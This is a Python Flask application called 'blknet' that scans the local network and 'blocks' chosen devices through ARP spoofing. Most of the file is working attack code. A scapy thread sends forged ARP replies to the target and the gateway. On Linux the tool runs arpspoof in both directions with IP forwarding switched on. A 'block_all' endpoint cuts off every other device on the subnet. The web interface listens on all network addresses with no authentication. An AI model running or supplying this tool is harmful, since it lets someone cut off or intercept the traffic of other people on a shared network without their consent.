#!/usr/bin/env python3
"""
blknet — Network Device Blocker GUI (Cross-Platform)
Works on Windows (PowerShell) and Linux (Kali NetHunter).

Windows: uses scapy for scanning + ARP spoofing (no nmap/arpspoof needed)
Linux:   uses nmap for scanning + arpspoof for blocking
"""

import os
import sys
import re
import time
import signal
import ipaddress
import threading
import subprocess
from flask import Flask, render_template, jsonify, request

app = Flask(__name__)

IS_WINDOWS = sys.platform == "win32"
IS_LINUX = sys.platform.startswith("linux")

# Store blocked devices
# Linux:  {ip: {"mac": "xx:xx", "pids": [pid1, pid2]}}
# Windows: {ip: {"mac": "xx:xx", "thread": Thread, "stop": Event}}
blocked = {}

# ============================================================
#  PLATFORM DETECTION HELPERS
# ============================================================

def get_interface():
    """Get the active network interface"""
    if IS_WINDOWS:
        return _get_win_interface()
    else:
        try:
            result = subprocess.run(["ip", "route"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if "default" in line:
                    parts = line.split()
                    if len(parts) >= 5:
                        return parts[4]
        except Exception:
            pass
        return "wlan0"


def _get_win_interface():
    """Get Windows interface name for scapy"""
    try:
        from scapy.interfaces import get_working_ifaces
        for iface in get_working_ifaces():
            if iface.ip and not iface.ip.startswith("127."):
                return iface.name
    except Exception:
        pass
    return None


def get_subnet():
    """Get network subnet"""
    own_ip = get_own_ip()
    if own_ip:
        try:
            # Try /24 first (common home network)
            for prefix in [24, 23, 22, 16]:
                try:
                    net = ipaddress.ip_network(f"{own_ip}/{prefix}", strict=False)
                    # Only use /24 for typical home networks
                    if prefix == 24:
                        return str(net)
                except Exception:
                    continue
            return f"{'.'.join(own_ip.split('.')[:3])}.0/24"
        except Exception:
            pass
    return "192.168.1.0/24"


def get_gateway():
    """Get default gateway IP"""
    if IS_WINDOWS:
        return _get_win_gateway()
    else:
        try:
            result = subprocess.run(["ip", "route"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if "default" in line:
                    return line.split()[2]
        except Exception:
            pass
        return "192.168.1.1"


def _get_win_gateway():
    """Get Windows default gateway via route print"""
    try:
        result = subprocess.run(
            ["route", "print", "0.0.0.0"],
            capture_output=True, text=True, timeout=10
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("0.0.0.0"):
                parts = line.split()
                if len(parts) >= 3:
                    gw = parts[2]
                    if gw != "0.0.0.0" and gw != "On-link":
                        return gw
    except Exception:
        pass
    # Fallback: use netsh
    try:
        result = subprocess.run(
            ["netsh", "interface", "ip", "show", "config"],
            capture_output=True, text=True, timeout=10
        )
        for line in result.stdout.splitlines():
            if "Default Gateway" in line:
                gw = line.split(":")[-1].strip()
                if gw and gw != "None":
                    return gw
    except Exception:
        pass
    return "192.168.1.1"


def get_own_ip():
    """Get own IP address"""
    if IS_WINDOWS:
        return _get_win_ip()
    else:
        iface = get_interface()
        try:
            result = subprocess.run(
                ["ip", "addr", "show", iface], capture_output=True, text=True
            )
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("inet "):
                    return line.split()[1].split("/")[0]
        except Exception:
            pass
        return None


def _get_win_ip():
    """Get Windows IP via socket"""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
        finally:
            s.close()
        return ip
    except Exception:
        return None


# ============================================================
#  NETWORK SCANNING
# ============================================================

def scan_with_scapy(subnet):
    """Scan network using scapy (Windows) — returns list of (ip, mac, vendor)"""
    try:
        from scapy.all import ARP, Ether, srp, conf
        iface = get_interface()
        if iface:
            conf.iface = iface

        arp = ARP(pdst=subnet)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=3, verbose=0)[0]

        devices = []
        for sent, received in result:
            ip = received.psrc
            mac = received.hwsrc
            vendor = _lookup_vendor(mac)
            devices.append((ip, mac, vendor))
        return devices
    except Exception as e:
        print(f"Scapy scan error: {e}")
        return []


def scan_with_nmap(subnet):
    """Scan network using nmap (Linux) — returns list of (ip, mac, vendor)"""
    own_ip = get_own_ip()
    devices = []
    try:
        result = subprocess.run(
            ["nmap", "-sn", "-n", subnet],
            capture_output=True, text=True, timeout=30
        )
        lines = result.stdout.splitlines()
        i = 0
        while i < len(lines):
            m = re.search(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", lines[i])
            if m:
                ip = m.group(1)
                mac = ""
                vendor = ""
                if i + 1 < len(lines):
                    mac_match = re.search(
                        r"MAC Address: ([0-9A-Fa-f:]{17}) ?\(?([^)]*)\)?",
                        lines[i + 1]
                    )
                    if mac_match:
                        mac = mac_match.group(1)
                        vendor = mac_match.group(2).strip()
                # Fallback: ARP table
                if not mac:
                    try:
                        arp_result = subprocess.run(
                            ["cat", "/proc/net/arp"],
                            capture_output=True, text=True
                        )
                        for arp_line in arp_result.stdout.splitlines()[1:]:
                            parts = arp_line.split()
                            if len(parts) >= 4 and parts[0] == ip:
                                mac = parts[3]
                                break
                    except Exception:
                        pass
                devices.append((ip, mac, vendor))
            i += 1
    except Exception as e:
        print(f"Nmap scan error: {e}")
    return devices


def _lookup_vendor(mac):
    """Basic vendor lookup from OUI prefix"""
    if not mac or mac == "Unknown":
        return "Unknown"
    prefix = mac.upper().replace(":", "")[:6]
    oui_db = {
        "EC:E6:A2": "Fiberhome",
        "80:9D:65": "FN-Link",
        "F0:18:98": "Bitdefender",
        "DC:A6:32": "Raspberry Pi",
        "B8:27:EB": "Raspberry Pi",
        "00:1A:11": "Google",
        "00:50:F1": "Cisco",
        "00:0C:29": "VMware",
        "00:1B:44": "Intel",
        "00:25:9C": "Cisco-Linksys",
        "00:24:B2": "Netgear",
        "00:1F:3F": "Apple",
        "00:25:00": "Apple",
        "AC:DE:48": "Apple",
        "AC:BC:32": "Apple",
        "DC:56:E7": "Apple",
        "3C:22:FB": "Apple",
        "A4:5E:60": "Apple",
        "70:14:A6": "D-Link",
        "00:13:46": "D-Link",
        "00:0F:38": "D-Link",
        "C0:4A:00": "TP-Link",
        "50:C7:BF": "TP-Link",
        "EC:08:6B": "TP-Link",
        "14:CC:20": "TP-Link",
        "18:A6:F7": "TP-Link",
        "00:E0:4C": "Realtek",
        "00:1E:58": "Realtek",
        "00:0C:76": "Realtek",
        "00:13:E8": "Realtek",
        "00:09:5B": "Netgear",
        "00:1F:33": "Netgear",
        "00:1B:2F": "Netgear",
        "20:E5:2A": "Netgear",
        "C0:3F:0E": "Netgear",
        "44:94:FC": "Netgear",
        "00:11:32": "Synology",
        "00:1B:78": "Samsung",
        "00:12:FB": "Samsung",
        "00:15:99": "Samsung",
        "00:1B:98": "Samsung",
        "90:18:7C": "Samsung",
        "60:21:C0": "Samsung",
        "CC:61:E5": "Samsung",
        "8C:77:12": "Samsung",
        "70:56:81": "Samsung",
        "00:1D:A1": "Samsung",
        "00:25:38": "Samsung",
        "E8:50:8B": "Samsung",
        "00:08:22": "Samsung",
        "00:17:C9": "Samsung",
        "00:12:47": "Samsung",
        "00:16:32": "Samsung",
        "90:B2:1F": "Samsung",
        "C8:69:CD": "Apple",
        "AC:3F:A4": "Apple",
        "7C:11:BE": "Apple",
        "00:26:BB": "Apple",
        "00:26:08": "Apple",
        "C8:B5:B7": "Apple",
        "B0:CA:68": "Apple",
        "AC:CF:85": "Asus",
        "00:0C:6E": "Asus",
        "00:0E:2E": "Asus",
        "00:13:74": "Asus",
        "00:15:F2": "Asus",
        "00:17:31": "Asus",
        "00:1A:92": "Asus",
        "00:1B:FC": "Asus",
        "00:1C:B3": "Asus",
        "00:1D:60": "Asus",
        "00:1E:8C": "Asus",
        "00:1F:C6": "Asus",
        "00:22:15": "Asus",
        "00:23:54": "Asus",
        "00:24:8C": "Asus",
        "00:26:18": "Asus",
        "00:50:43": "Asus",
        "08:60:6E": "Asus",
        "10:BF:48": "Asus",
        "14:DA:E9": "Asus",
        "1C:87:74": "Dell",
        "00:13:72": "Dell",
        "00:14:22": "Dell",
        "00:15:C5": "Dell",
        "00:16:CB": "Dell",
        "00:1C:23": "Dell",
        "00:1D:09": "Dell",
        "00:1E:C9": "Dell",
        "00:21:70": "Dell",
        "00:23:14": "Dell",
        "00:24:E8": "Dell",
        "00:25:64": "Dell",
        "00:26:B9": "Dell",
        "00:27:0E": "Dell",
        "00:8C:FA": "Dell",
        "00:B0:D0": "Dell",
        "00:C0:4F": "Dell",
        "00:D0:56": "Dell",
        "00:E0:18": "Dell",
        "00:F0:1E": "Dell",
        "02:E0:18": "Dell",
        "08:00:27": "VirtualBox",
        "52:54:00": "QEMU/KVM",
    }
    for oui, name in oui_db.items():
        if prefix.startswith(oui.replace(":", "")):
            return name
    return "Unknown"


# ============================================================
#  ARP SPOOFING
# ============================================================

def _win_arpspoof_thread(target_ip, gateway_ip, stop_event):
    """Thread that continuously sends ARP spoof packets via scapy"""
    try:
        from scapy.all import ARP, send, conf
        iface = get_interface()
        if iface:
            conf.iface = iface

        while not stop_event.is_set():
            # Tell target: gateway is us
            pkt1 = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                       psrc=gateway_ip, hwsrc="00:00:00:00:00:00")
            send(pkt1, verbose=0)
            # Tell gateway: target is us
            pkt2 = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                       psrc=target_ip, hwsrc="00:00:00:00:00:00")
            send(pkt2, verbose=0)
            time.sleep(1)
    except Exception as e:
        print(f"ARP spoof thread error: {e}")


def _win_block(target_ip, gateway_ip):
    """Start ARP spoof on Windows using scapy"""
    stop_event = threading.Event()
    t = threading.Thread(
        target=_win_arpspoof_thread,
        args=(target_ip, gateway_ip, stop_event),
        daemon=True
    )
    t.start()
    blocked[target_ip] = {"thread": t, "stop": stop_event}


def _win_unblock(target_ip):
    """Stop ARP spoof on Windows"""
    if target_ip in blocked:
        info = blocked[target_ip]
        info["stop"].set()
        # Wait for thread to stop
        if info.get("thread"):
            info["thread"].join(timeout=3)
        del blocked[target_ip]


def _linux_block(target_ip, gateway_ip, mac=""):
    """Start ARP spoof on Linux using arpspoof"""
    iface = get_interface()
    # Enable IP forwarding
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception:
        pass

    pids = []
    p1 = subprocess.Popen(
        ["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    pids.append(p1.pid)
    p2 = subprocess.Popen(
        ["arpspoof", "-i", iface, "-t", gateway_ip, target_ip],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    pids.append(p2.pid)
    blocked[target_ip] = {"mac": mac, "pids": pids}


def _linux_unblock(target_ip):
    """Stop ARP spoof on Linux"""
    if target_ip in blocked:
        for pid in blocked[target_ip].get("pids", []):
            try:
                os.kill(pid, signal.SIGTERM)
            except Exception:
                pass
        del blocked[target_ip]


# ============================================================
#  FLASK ROUTES
# ============================================================

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/scan")
def scan_network():
    subnet = get_subnet()
    own_ip = get_own_ip()
    gateway = get_gateway()
    iface = get_interface() or "auto"

    if IS_WINDOWS:
        raw_devices = scan_with_scapy(subnet)
    else:
        raw_devices = scan_with_nmap(subnet)

    devices = []
    for ip, mac, vendor in raw_devices:
        is_self = ip == own_ip
        is_gateway = ip == gateway
        is_blocked = ip in blocked

        if is_gateway:
            dev_type = "Router"
        elif is_self:
            dev_type = "This Device"
        else:
            dev_type = "Device"

        devices.append({
            "ip": ip,
            "mac": mac or "Unknown",
            "vendor": vendor or "Unknown",
            "type": dev_type,
            "self": is_self,
            "gateway": is_gateway,
            "blocked": is_blocked,
        })

    return jsonify({
        "devices": devices,
        "gateway": gateway,
        "interface": iface,
        "subnet": subnet,
        "own_ip": own_ip,
    })


@app.route("/api/block", methods=["POST"])
def block_device():
    data = request.json
    ip = data.get("ip")
    mac = data.get("mac", "")
    if not ip:
        return jsonify({"error": "IP required"}), 400
    if ip in blocked:
        return jsonify({"error": "Already blocked"}), 400

    gateway = get_gateway()
    if IS_WINDOWS:
        _win_block(ip, gateway)
    else:
        _linux_block(ip, gateway, mac)
    return jsonify({"success": True, "ip": ip})


@app.route("/api/unblock", methods=["POST"])
def unblock_device():
    data = request.json
    ip = data.get("ip")
    if not ip:
        return jsonify({"error": "IP required"}), 400
    if ip not in blocked:
        return jsonify({"error": "Not blocked"}), 400

    if IS_WINDOWS:
        _win_unblock(ip)
    else:
        _linux_unblock(ip)
    return jsonify({"success": True, "ip": ip})


@app.route("/api/block_all", methods=["POST"])
def block_all():
    subnet = get_subnet()
    own_ip = get_own_ip()
    gateway = get_gateway()

    if IS_WINDOWS:
        raw_devices = scan_with_scapy(subnet)
    else:
        raw_devices = scan_with_nmap(subnet)

    results = []
    for ip, mac, vendor in raw_devices:
        if ip == own_ip or ip == gateway:
            continue
        if ip in blocked:
            results.append({"ip": ip, "status": "already_blocked"})
            continue
        try:
            if IS_WINDOWS:
                _win_block(ip, gateway)
            else:
                _linux_block(ip, gateway, mac)
            results.append({"ip": ip, "status": "blocked"})
        except Exception as e:
            results.append({"ip": ip, "status": "error", "error": str(e)})

    return jsonify({"success": True, "results": results})


@app.route("/api/unblock_all", methods=["POST"])
def unblock_all():
    results = []
    for ip in list(blocked.keys()):
        if IS_WINDOWS:
            _win_unblock(ip)
        else:
            _linux_unblock(ip)
        results.append(ip)
    return jsonify({"success": True, "unblocked": results})


@app.route("/api/status")
def status():
    if IS_WINDOWS:
        # Clean up finished threads
        alive = {}
        for ip, info in blocked.items():
            t = info.get("thread")
            s = info.get("stop")
            if t and s and t.is_alive():
                alive[ip] = True
            else:
                s.set() if s else None
        blocked.clear()
        blocked.update(alive)
        return jsonify({"blocked": list(blocked.keys()), "details": blocked})
    else:
        alive = {}
        for ip, info in blocked.items():
            live_pids = []
            for pid in info.get("pids", []):
                try:
                    os.kill(pid, 0)
                    live_pids.append(pid)
                except OSError:
                    pass
            if live_pids:
                alive[ip] = {"mac": info.get("mac", ""), "pids": live_pids}
        blocked.clear()
        blocked.update(alive)
        return jsonify({"blocked": list(blocked.keys()), "details": blocked})


# ============================================================
#  MAIN
# ============================================================

if __name__ == "__main__":
    print("=" * 50)
    print("  blknet — Network Device Blocker")
    print("=" * 50)
    print(f"  Platform : {'Windows' if IS_WINDOWS else 'Linux'}")
    print(f"  Interface: {get_interface() or 'auto'}")
    print(f"  IP       : {get_own_ip()}")
    print(f"  Subnet   : {get_subnet()}")
    print(f"  Gateway  : {get_gateway()}")
    print(f"  Engine   : {'scapy' if IS_WINDOWS else 'nmap + arpspoof'}")
    print("=" * 50)
    print("  Access: http://127.0.0.1:5000")
    print("=" * 50)

    if IS_WINDOWS:
        print("\n  NOTE: Run as Administrator!")
        print("  Npcap must be installed for ARP spoofing.\n")

    app.run(host="0.0.0.0", port=5000, debug=False)
